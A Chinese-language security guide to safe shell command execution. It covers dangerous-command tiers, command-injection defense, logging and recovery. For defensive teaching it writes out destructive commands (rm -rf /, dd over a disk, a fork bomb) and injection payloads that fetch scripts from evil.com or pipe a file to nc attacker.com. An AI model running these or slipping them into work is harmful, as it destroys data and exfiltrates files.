# Shell 命令安全指南

## 安全原则

### 1. 最小权限原则
- 永远不要以 root 身份运行不必要的命令
- 避免使用 `sudo`，除非绝对必要
- 在沙盒环境中测试危险命令

### 2. 验证优先
- **始终**在执行前验证命令
- 检查危险模式
- 确认用户意图

### 3. 防御性执行
- 设置超时防止挂起
- 限制输出大小防止内存溢出
- 捕获所有错误

---

## 危险命令分类

### 🔴 极度危险（永远禁止）

| 命令 | 风险 | 替代方案 |
|------|------|----------|
| `rm -rf /` | 删除整个文件系统 | 指定具体路径 |
| `dd if=/dev/zero of=/dev/sda` | 擦除磁盘 | 使用专用工具 |
| `:(){ :|:& };:` | Fork bomb 耗尽资源 | 使用进程限制 |
| `mkfs /dev/sda` | 格式化磁盘 | 备份后操作 |

### 🟡 需要确认（谨慎使用）

| 命令 | 风险 | 确认要点 |
|------|------|----------|
| `rm file.txt` | 永久删除文件 | 确认文件名正确 |
| `mv source dest` | 覆盖目标文件 | 确认目标路径 |
| `chmod 777 file` | 开放所有权限 | 使用最小权限 |
| `pip install pkg` | 安装未知代码 | 检查包来源 |

### 🟢 相对安全（可直接执行）

| 命令 | 用途 | 注意事项 |
|------|------|----------|
| `ls`, `pwd`, `whoami` | 信息查询 | 无副作用 |
| `cat`, `head`, `tail` | 查看文件 | 注意文件大小 |
| `grep`, `wc`, `sort` | 文本处理 | 输入可能很大 |
| `ps`, `top` | 进程监控 | 只读操作 |

---

## 命令注入攻击防护

### 常见攻击模式

```bash
# 1. 命令分隔符注入
user_input = "file.txt; rm -rf /"
cmd = f"cat {user_input}"  # ❌ 危险！

# 2. 反引号注入
user_input = "`wget evil.com/malware.sh`"
cmd = f"echo {user_input}"  # ❌ 危险！

# 3. $() 注入
user_input = "$(curl evil.com/script.sh)"
cmd = f"echo {user_input}"  # ❌ 危险！

# 4. 管道注入
user_input = "file.txt | nc attacker.com 4444"
cmd = f"cat {user_input}"  # ❌ 危险！
```

### 防护措施

1. **白名单验证**：只允许已知安全的命令
2. **参数转义**：对用户输入进行转义
3. **使用数组**：避免字符串拼接
   ```python
   # ✅ 安全
   subprocess.run(['ls', '-la', user_path])
   
   # ❌ 危险
   subprocess.run(f"ls -la {user_path}", shell=True)
   ```
4. **沙盒执行**：在受限环境中运行

---

## 最佳实践

### 1. 文件操作

```bash
# ✅ 好的做法
cp file.txt file.txt.bak    # 先备份
rm file.txt                  # 再删除

# ❌ 坏的做法
rm file.txt                  # 直接删除，无法恢复
```

### 2. 目录遍历

```bash
# ✅ 安全：限制搜索深度
find . -maxdepth 3 -name "*.py"

# ❌ 危险：可能遍历整个文件系统
find / -name "*.py"
```

### 3. 网络操作

```bash
# ✅ 安全：指定超时
curl --max-time 10 https://example.com

# ❌ 危险：可能无限等待
curl https://example.com
```

### 4. 进程管理

```bash
# ✅ 安全：限制资源
timeout 60 long_running_command

# ❌ 危险：可能永远运行
long_running_command
```

---

## 环境变量安全

### 危险的环境变量使用

```bash
# ❌ 不要这样做
export PATH="$PATH:/untrusted/dir"
eval "$USER_INPUT"

# ✅ 安全的做法
export PATH="/trusted/dir:$PATH"
printf '%s\n' "$USER_INPUT"
```

### 敏感信息保护

```bash
# ❌ 不要在命令行暴露密码
mysql -u root -pMyPassword

# ✅ 使用环境变量或配置文件
mysql --defaults-file=~/.my.cnf
```

---

## 审计和日志

### 记录命令执行

```python
import logging
import datetime

logging.basicConfig(filename='command_audit.log', level=logging.INFO)

def log_command(command: str, result: dict):
    """记录命令执行"""
    log_entry = {
        'timestamp': datetime.datetime.now().isoformat(),
        'command': command,
        'exit_code': result['exit_code'],
        'execution_time': result['execution_time'],
        'success': result['success']
    }
    logging.info(log_entry)
```

### 审查要点

- 谁执行了命令？
- 执行了什么命令？
- 何时执行的？
- 结果如何？
- 是否有异常？

---

## 应急处理

### 误删文件恢复

```bash
# 1. 立即停止写入
mount -o remount,ro /

# 2. 使用恢复工具
testdisk
photorec

# 3. 从备份恢复
cp backup/file.txt restored/file.txt
```

### 进程失控处理

```bash
# 1. 查找进程
ps aux | grep runaway_process

# 2. 终止进程
kill -9 <PID>

# 3. 如果无法终止
killall -9 process_name
```

### 系统负载过高

```bash
# 1. 检查负载
uptime
top

# 2. 找出资源占用高的进程
ps aux --sort=-%cpu | head

# 3. 限制或终止
renice +19 -p <PID>  # 降低优先级
kill <PID>           # 终止进程
```

---

## 工具推荐

### 安全检查工具

- **shellcheck**: Shell 脚本静态分析
- **rkhunter**: Rootkit 检测
- **clamav**: 病毒扫描
- **auditd**: Linux 审计框架

### 沙盒工具

- **docker**: 容器化执行
- **firejail**: 轻量级沙盒
- **bubblewrap**: 无特权沙盒
- **nsjail**: Google 开发的沙盒

---

## 参考资源

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Linux Security Best Practices](https://www.cyberciti.biz/tips/linux-security.html)
- [Bash Pitfalls](http://mywiki.wooledge.org/BashPitfalls)

---

**记住**：安全第一，宁可过于谨慎，也不要冒险执行！
